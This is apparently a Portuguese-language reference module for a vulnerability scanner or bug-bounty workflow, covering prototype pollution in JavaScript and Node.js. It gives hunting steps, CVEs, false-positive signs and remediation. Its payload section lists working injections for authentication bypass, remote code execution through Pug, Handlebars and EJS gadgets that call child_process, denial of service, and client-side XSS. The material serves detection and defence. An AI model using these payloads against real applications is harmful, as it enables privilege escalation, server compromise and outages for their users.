---
id: prototype_pollution
title: "Prototype Pollution"
module: "ProtoPollution"
severity: "MEDIUM"
cwe_id: "CWE-1321"
cwe_title: "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L"
vrt_id: "server_security_misconfiguration.prototype_pollution"
---

## Summary
Injecao de propriedades em `Object.prototype` via `__proto__` ou `constructor.prototype` em parametros de query ou JSON body permite modificar o comportamento de todos os objetos da aplicacao, levando a XSS, bypass de autenticacao, RCE ou negacao de servico.

## Description
Prototype pollution e uma vulnerabilidade especifica de JavaScript (client-side e server-side Node.js) que explora a cadeia de prototipos. Quando a aplicacao faz merge/deep-copy de dados controlados pelo usuario em objetos sem filtrar chaves especiais (`__proto__`, `constructor`, `prototype`), o atacante pode injetar propriedades que serao herdadas por todos os objetos da aplicacao.

Variantes:

- **Client-side (DOM):** query params como `?__proto__[ppcanary]=value` sao parseados por bibliotecas como `qs`, `query-string` ou `jQuery.extend()` e poluem o prototype no browser. Consequencias: XSS via gadgets em frameworks (jQuery, Lodash, Vue), DOM clobbering, bypass de sanitizers.
- **Server-side (Node.js):** JSON body com `{"__proto__": {"isAdmin": true}}` processado por `Object.assign()`, `lodash.merge()`, `hoek.merge()` ou deep-copy custom. Consequencias: escalada de privilegios, bypass de autenticacao, RCE via gadgets em template engines (Pug, Handlebars, EJS).
- **Deep merge persistence:** quando a poluicao persiste em objetos compartilhados (singleton, config global), afeta todas as requisicoes subsequentes de todos os usuarios.
- **Parameter pollution:** injecao de `__proto__` como parametro GET junto com parametros normais, exploitando parsers de query string que criam objetos aninhados.

Deteccao: injetar canary via `__proto__[canary]=value` e verificar se o canary aparece em objetos nao relacionados na resposta. Comparacao diferencial entre baseline e resposta com payload e chave para reduzir falsos positivos.

## Impact
- Cross-Site Scripting (XSS) via gadgets em frameworks client-side.
- Bypass de autenticacao quando `isAdmin`, `role` ou `auth` sao herdados do prototype poluido.
- Execucao remota de codigo (RCE) via gadgets em template engines (Pug, Handlebars, EJS).
- Negacao de servico quando propriedades poluidas quebram logica de controle de fluxo.
- Escalada de privilegios em aplicacoes multi-tenant.
- Corrupcao de estado compartilhado em objetos singleton.

## Payloads and Bypasses
```
# -- Client-side (query params) --
?__proto__[canary]=value
?constructor.prototype.canary=value
?__proto__[constructor][prototype][canary]=value
?__proto__.canary=value
# Combinado com parametro normal:
?search=test&__proto__[ppcanary]=value&constructor[prototype][ppcanary]=value

# -- Server-side (JSON body) --
{"__proto__": {"canary": "value"}}
{"constructor": {"prototype": {"canary": "value"}}}
{"a": {"__proto__": {"canary": "value"}}}

# -- Escalada: bypass de autenticacao --
{"__proto__": {"isAdmin": true}}
{"__proto__": {"role": "admin"}}
{"__proto__": {"authenticated": true}}

# -- Escalada: RCE via template engine gadgets --
# Pug:
{"__proto__": {"block": {"type": "Text", "val": "require('child_process').execSync('id')"}}}
# Handlebars:
{"__proto__": {"pendingContent": "require('child_process').execSync('id')"}}
# EJS:
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

# -- Negacao de servico --
{"__proto__": {"toString": null}}
{"__proto__": {"valueOf": null}}
{"__proto__": {"length": 999999999}}
```

## Target Context (Crawler Hints)
- **Parametros comuns:** `q`, `query`, `search`, `name`, `data`, `input`, `config`, `options`, `settings`, `user`, `filter`.
- **Paths comuns:** `/`, `/api/`, `/api/v1/`, `/search`, `/login`, `/register`, `/settings`.
- **Sinais:** aplicacao Node.js/Express (header `X-Powered-By: Express`); uso de bibliotecas de merge (lodash, hoek, jQuery); respostas JSON que refletem propriedades injetadas; erros TypeError apos injecao de __proto__.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2019-10744 | lodash | 2019 | Prototype pollution via lodash.defaultsDeep() permite injecao de propriedades em qualquer objeto -- afeta milhoes de projetos npm | Server-side PP |
| CVE-2018-16487 | lodash | 2018 | Prototype pollution via lodash.merge() e lodash.mergeWith() | Server-side PP |
| CVE-2019-7609 | Kibana | 2019 | Prototype pollution no Timelion permite RCE via NODE_OPTIONS injection | PP to RCE |
| CVE-2020-28469 | glob-parent | 2020 | ReDoS via prototype pollution no glob-parent usado por chokidar/webpack | PP to DoS |
| CVE-2022-21824 | Node.js | 2022 | Prototype pollution via console.table() permite bypass de __proto__ sanitization | Runtime PP |

## Hunting Methodology
1. Mapear todos os endpoints que aceitam JSON body ou query params com estrutura aninhada -- APIs REST, search, login, register, settings, profile update.
2. Identificar o stack tecnologico: `X-Powered-By: Express`, presenca de `/_next/`, `/__nuxt/`, bundles Webpack/Vite indicam Node.js.
3. Injetar canary via query param: `?__proto__[ppcanary]=polluted` e `?constructor.prototype.ppcanary=polluted`. Comparar resposta com baseline -- se a propriedade `ppcanary` aparecer em objetos da resposta, ha pollution.
4. Testar JSON body em endpoints POST/PUT/PATCH: `{"__proto__": {"ppcanary": "polluted"}}` e `{"constructor": {"prototype": {"ppcanary": "polluted"}}}`. Verificar se o canary persiste em respostas subsequentes (indica objeto compartilhado).
5. Para client-side: injetar `?__proto__[innerHTML]=<img/src/onerror=alert(1)>` e inspecionar DOM/console. Verificar se frameworks client-side (jQuery, Lodash, Vue) usam deep merge sem sanitizacao.
6. Analisar JS bundles e source maps para identificar uso de funcoes vulneraveis: `lodash.merge`, `lodash.defaultsDeep`, `jQuery.extend(true,...)`, `hoek.merge`, `Object.assign` com objetos aninhados, deep-copy custom sem filtragem de `__proto__`.
7. Verificar se a aplicacao usa `qs` (versoes < 6.10 permitem `__proto__` por default) ou `query-string` para parsing de parametros.

## Escalation Techniques
- **RCE via server-side pollution:** sobrescrever propriedades usadas por template engines (Pug `block`, Handlebars `pendingContent`, EJS `outputFunctionName`) para injetar codigo Node.js executado no servidor.
- **XSS via client-side pollution:** sobrescrever `innerHTML`, `src`, `href`, `srcdoc` em gadgets de frameworks (jQuery `.html()`, Vue `v-html`, Angular `[innerHTML]`) para executar JavaScript no browser de outros usuarios.
- **Bypass de autenticacao:** sobrescrever propriedades de autorizacao (`isAdmin`, `role`, `authenticated`, `permissions`) quando a aplicacao usa `obj.isAdmin || false` -- o prototype poluido retorna `true`.
- **DoS via corruption de propriedades criticas:** sobrescrever `toString`, `valueOf`, `hasOwnProperty`, `length` em `Object.prototype` causa TypeError em toda a aplicacao, afetando todos os usuarios.
- **Privilege escalation em multi-tenant:** quando objetos de configuracao sao compartilhados entre tenants, pollution em um tenant afeta todos.
- **Exfiltracao via DNS/HTTP:** combinar com SSRF gadgets que leiam propriedades do prototype para exfiltrar dados internos.

## False Positive Indicators
- Aplicacao retorna HTTP 200 mas a propriedade canary nao persiste em objetos subsequentes -- indica que o merge e feito em objeto temporario descartado por request.
- Framework sanitiza `__proto__` antes do merge (Express `body-parser` >= 1.20.0, `qs` >= 6.10 com `allowPrototypes: false`).
- Payload `__proto__` aparece refletido na resposta como string literal (ex.: `{"__proto__": {"canary": "value"}}` devolvido como echo) mas nao e interpretado como modificacao de prototype -- e reflexao, nao pollution.
- Objeto e recriado a cada request (`new Config()`, `Object.create(null)`) -- mesmo que o merge processe `__proto__`, nao ha persistencia entre requests.
- TypeErrors no log do servidor apos payload de pollution podem indicar sanitizacao defensiva (try/catch) e nao vulnerabilidade exploravel.

## Recommendation
1. Usar `Object.create(null)` ou `Map` para armazenar dados de usuario -- objetos sem prototype nao sao afetados.
2. Rejeitar chaves `__proto__`, `constructor` e `prototype` em todo input parsing (query params, JSON body, form data).
3. Usar parser de query string seguro (`qs` com `allowPrototypes: false` -- default desde v6.10).
4. Substituir `Object.assign()` e deep-merge custom por funcoes que ignoram propriedades do prototype chain.
5. Congelar `Object.prototype` em aplicacoes client-side (`Object.freeze(Object.prototype)`).
6. Validar JSON schema e rejeitar chaves inesperadas antes de processar.
7. Atualizar lodash, hoek, jQuery e outras bibliotecas de merge para versoes corrigidas.
8. Implementar Content Security Policy (CSP) para mitigar XSS caso prototype pollution ocorra client-side.
